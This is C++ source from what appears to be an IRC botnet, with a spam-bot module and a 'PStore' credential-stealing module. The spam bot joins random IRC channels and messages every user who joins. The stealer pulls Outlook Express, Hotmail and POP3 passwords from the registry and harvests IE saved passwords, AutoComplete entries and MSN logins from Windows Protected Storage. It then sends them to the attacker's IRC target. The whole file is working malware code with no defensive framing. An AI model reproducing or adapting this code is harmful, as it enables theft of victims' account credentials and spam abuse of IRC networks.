/* IRC Spreader by Null */
/* think twice what are going to do. */
//Pstore add, Nice :D

#ifndef NO_SPAMBOT
#include "../headers/includes.h"
#include "../headers/functions.h"

char channels[50][30] = {0};
char msg2spam[IRCLINE];
int chan_count = 0;

int nick_busy(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc2spam=(IRC*)conn;
	
	irc2spam->nick(irc2spam->nickgen(N_RNDLTR,rand()%10+4));
	
	return 0;
}

int get_list(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc2spam=(IRC*)conn;
	
	Sleep(2000);
	irc2spam->raw("LIST >%i", (rand()%100)+50);
	
	return 0;
}

int get_channels(char* params, irc_reply_data* hostd, void* conn)
{

	if (chan_count == 50)
	{
		IRC* irc2spam=(IRC*)conn;
		
		irc2spam->raw("LIST STOP");
		Sleep(2000);
		
		return 0;
	}
	
	char *a[1];

	SplitParams(a,params,2);
	strncpy(channels[chan_count],a[1],sizeof(channels[chan_count]));
	chan_count++;
	
	return 0;
}

int rand_join(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc2spam=(IRC*)conn;
	
	for(int i = 0; i < 4;i++)
		irc2spam->join(channels[rand()%chan_count],"");
	
	return 0;
}

int kicked_out(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc2spam=(IRC*)conn;

	if(strstr(params, irc2spam->current_nick()))
		irc2spam->join(channels[rand()%chan_count],"");
	
	return 0;
}

int send_link(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc2spam=(IRC*)conn;
	
	irc2spam->privmsg(hostd->nick, msg2spam);
	
	return 0;
}

DWORD WINAPI SpamBot (LPVOID param)
{
	NTHREAD spambot = *((NTHREAD *)param);
	NTHREAD *spambots = (NTHREAD *)param;
	spambots->gotinfo = TRUE;
	
	strncpy(msg2spam, spambot.data2, sizeof(msg2spam));
	
	IRC irc2spam;

	srand(GetTickCount());
	
	irc2spam.hook_irc_command("433",  &nick_busy);	      /* nick en uso? generar uno nuevo */
	irc2spam.hook_irc_command("376",  &get_list);         /* pedir la lista al final del motd */
	irc2spam.hook_irc_command("322",  &get_channels);     /* adquirir los canales */
	irc2spam.hook_irc_command("323",  &rand_join);        /* entrar a un canal al final de la lista */
	//irc2spam.hook_irc_command("474",  &rand_join);      /* baniado? entrar en otro canal */
	irc2spam.hook_irc_command("KICK", &kicked_out);       /* kickiado? entrar en otro canal */
	irc2spam.hook_irc_command("JOIN", &send_link);        /* entro alguien? spamiarlo */
	
	// nos conectamos.
	irc2spam.start(spambot.data1,                         /* server */
		spambot.idata1,                                   /* port */
		irc2spam.nickgen(N_RNDLTR,rand()%10+4),           /* nick */
		irc2spam.nickgen(N_RNDLTR,rand()%6+1),            /* ident */
		irc2spam.nickgen(N_RNDLTR,rand()%10+1),           /* name */
		"");								              /* server pass */
	
	irc2spam.message_loop();

	clearthread(spambot.threadnum);
	ExitThread(0);
}
#endif

#ifndef NO_PSTORE
extern char str_nopstore[];
extern char str_noadvapi[];

DWORD WINAPI PStore(LPVOID param)
{
	NTHREAD pstore = *((NTHREAD*)param);
	NTHREAD *pstores = (NTHREAD *)param;
	pstores->gotinfo = TRUE;
	IRC* irc=(IRC*)pstore.conn;

	char filter[IRCLINE];
	
	if (pstore.data1)
		strncpy(filter,pstore.data1,sizeof(filter));

	if (!noadvapi32)
		EnumOutlookAccounts();
	else
		irc->privmsg(pstore.target,str_noadvapi,pstore_title);

	if (!nopstore)
	{
		if (pstore.data1)
			EnumPStorage(pstore.target,irc,filter,pstore.silent,pstore.verbose);
		else
			EnumPStorage(pstore.target,irc,NULL,pstore.silent,pstore.verbose);
	}
	else
		irc->privmsg(pstore.target,str_nopstore,pstore_title);
			
	clearthread(pstore.threadnum);
	ExitThread(0);
}

OOUTDATA OutlookData[50];
int oIndex=0;
void EnumOutlookAccounts()
{
	ZeroMemory(OutlookData,sizeof(OutlookData));
	HKEY hkeyresult ,hkeyresult1;
	long l,i;
	char name[200],skey[200];
	DWORD dw2;
	FILETIME f;
	lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	LONG lResult=fRegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult1);
	if (ERROR_SUCCESS != lResult)
		return ;
	
	i=0;l=0;
	BYTE Data[150];
	BYTE Data1[150];
	DWORD size;
	int j;
	j=0;
	DWORD type=REG_BINARY;
	while (l!=ERROR_NO_MORE_ITEMS) {
		dw2=200;
		l=fRegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
		lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
		lstrcat(skey,"\\");
		lstrcat(skey,name);
		fRegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult);
		size=sizeof(Data);
		if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			lstrcpy(OutlookData[oIndex].POPserver,"Hotmail");
			size=sizeof(Data);
			if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				//char mess[100];
				for(int i=2;i<size;i++)
					if (IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
					OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data));
			oIndex++;
		}
		else if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			fRegQueryValueEx ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, Data, &size ) ;
			lstrcpy(OutlookData[oIndex].POPserver,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			if(fRegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				//char mess[100];
				for(int i=2;i<size;i++)
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
					OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}
}


BOOL EnumPStorage(char *target,void *conn,char *filter,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;

	if (!IsServiceRunning("ProtectedStorage"))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s Protected Storage is not running.",pstore_title);
		return FALSE;
	}

#ifndef NO_SERVICE
	ImpersonateInteractiveUser();
#endif

	int iSent=0;
	IPStorePtr PStore; 
	HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
	if (FAILED(hRes))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s PStoreCreateInstance failed.",pstore_title);
		return FALSE;
	}

	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
	if (FAILED(hRes))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s Failed to query Protected Storage.",pstore_title);
		return FALSE;
	}

	GUID TypeGUID;
	char szItemName[512];
	char szItemData[512];
	char szResName[1512];
	char szResData[512];
	char szItemGUID[50];

	while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
	{
		wsprintf(szItemGUID,"%x",TypeGUID);

		IEnumPStoreTypesPtr EnumSubTypes;
		hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

		GUID subTypeGUID;
		while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
		{
			IEnumPStoreItemsPtr spEnumItems;
			HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

			LPWSTR itemName;
			while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
			{
				wsprintf(szItemName,"%ws",itemName);			 
				char chekingdata[200];
				unsigned long psDataLen = 0;
				unsigned char *psData = NULL;
				_PST_PROMPTINFO *pstiinfo = NULL;
				hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
				if(lstrlen((char *)psData)<(psDataLen-1))
				{
					int i=0;
					for(int m=0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
							szItemData[i]=',';
						else
							szItemData[i]=psData[m];
						i++;
					}
					szItemData[i-1]=0;				  			
				}
				else
				{
					wsprintf(szItemData,"%s",psData);				  
				}	
				lstrcpy(szResName,"");
				lstrcpy(szResData,"");

				//5e7e8100 - IE:Password-Protected sites
				if (lstrcmp(szItemGUID,"5e7e8100")==0)
				{				  
					lstrcpy(chekingdata,"");
					if(strstr(szItemData,":")!=0)
					{
						lstrcpy(chekingdata,strstr(szItemData,":")+1);
						*(strstr(szItemData,":"))=0;				  
					}
					iSent++;
					if ((strcmp(szItemData,"") && strcmp(chekingdata,"")) || verbose)
						irc->privmsg_filter(target,filter,"%s IE Password Protected: %s, %s:%s",pstore_title,szItemName,szItemData,chekingdata);
				}

				//e161255a - IE:AutoComplete
				if (lstrcmp(szItemGUID,"e161255a")==0)
				{
					if (strstr(szItemName,"StringIndex")==0)
					{
						if(strstr(szItemName,":String")!=0)
							*strstr(szItemName,":String")=0;
						
						lstrcpyn(chekingdata,szItemName,8);			  

						if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
						{
							lstrcpy(chekingdata,"");
							if(strstr(szItemData,",")!=0)
							{
								lstrcpy(chekingdata,strstr(szItemData,",")+1);
								*(strstr(szItemData,","))=0;				  
							}
							iSent++;
							if ((strcmp(szItemData,"") && strcmp(chekingdata,"")) || verbose)
								irc->privmsg_filter(target,filter,"%s IE Auto-Complete: %s , %s:%s",pstore_title,szItemName,szItemData,chekingdata);
						}
					}
				}
				//	  b9819c52 MSN Explorer Signup
				if (lstrcmp(szItemGUID,"b9819c52")==0)
				{
					char msnid[100];
					char msnpass[100];
					int i=0;
					BOOL first=TRUE;
					for(int m=0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
						{
							szItemData[i]=',';					
							i++;
						}
						else
						{
							if (IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_'))
							{
								szItemData[i]=psData[m];					
								i++;
							}							
						}
					}
					szItemData[i-1]=0;
					char *p;
					p=szItemData+2;
					//psData[4] - number of msn accounts 
					for(int ii=0;ii<psData[4];ii++)
					{
						lstrcpy(msnid,p+1);
						if (strstr(msnid,",")!=0)
							*strstr(msnid,",")=0;
					
						if(strstr(p+1,",")!=0)
							lstrcpy(msnpass,strstr(p+1,",")+2);				

						if(strstr(msnpass,",")!=0)
							*strstr(msnpass,",")=0;

						p=strstr(p+1,",")+2+lstrlen(msnpass)+7;
						if ((strcmp(msnpass,"") && strcmp(msnid,"")) || verbose)
						{
							iSent++;
							irc->privmsg_filter(target,filter,"%s MSN: %s:%s",pstore_title,msnid,msnpass);
						}
					}
				}

				//220d5cc1 Outlooks
				if (lstrcmp(szItemGUID,"220d5cc1")==0)
				{
					BOOL bDeletedOEAccount=TRUE;		
					for (int i=0;i<oIndex;i++)
					{
						if((lstrcmp(OutlookData[i].POPpass,szItemName)==0)&&(strcmp(szItemData,"")))
						{
							bDeletedOEAccount=FALSE;
							iSent++;
							irc->privmsg_filter(target,filter,"%s Outlook Express: %s, %s:%s",pstore_title,OutlookData[i].POPserver,OutlookData[i].POPuser,szItemData);
							break;
						}
					}
					if (bDeletedOEAccount && ((strcmp(szItemData,"") && strcmp(OutlookData[i].POPuser,"")) || verbose))
					{
						iSent++;
						irc->privmsg_filter(target,filter,"%s Erased Outlook Express: %s:%s",pstore_title,OutlookData[i].POPuser,szItemData);
					}
				}

				ZeroMemory(szItemName,sizeof(szItemName));
				ZeroMemory(szItemData,sizeof(szItemData));			  
			}
		}
	}
	if (iSent==0)
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s No Protected Storage entries found.",pstore_title);
	}
	return TRUE;
}
#endif
